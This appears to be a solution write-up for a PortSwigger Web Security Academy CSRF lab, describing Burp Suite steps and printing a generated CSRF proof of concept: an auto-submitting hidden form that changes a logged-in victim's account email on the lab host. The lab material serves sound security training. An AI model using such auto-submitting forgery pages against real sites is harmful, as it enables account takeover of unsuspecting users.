![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/7137469b-9962-4d5d-92d1-0b36bad0f9d4)

### Solution

Open Burp's browser and log in to your account using wener:peter.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/9fff4e17-639f-41fc-ac62-f4470e215634)

now we will update the email using update email option

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/1aacfedb-3aae-4a79-b5e6-2db17fe57d66)

updated the email

now we will find the update email request in web history in burp

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/45e5ca9c-12ee-4ac4-b931-25b70ffbd24f)

now send it to the repeater and right-click on the request and select Engagement tools / Generate CSRF PoC.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/a61046bf-6b47-4197-8fa5-80057e7dcd6c)

i changed the email from abcd to rahul

the payload

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a7b00600391455a8192213c00e70044.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="rahul&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

now go to the exploit server and paste the payload in  the body section.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/3c079701-d742-4b2f-9a13-59abd8f47c82)

now store and view the exploit

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/42738f9c-a1ef-4168-8384-7f2d66719d45)

after clicking the view we can see that it works.

now we deliver the payload

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/b099943a-bd0e-43e6-8a3f-9eeed945f74e)

lab solved succesfully
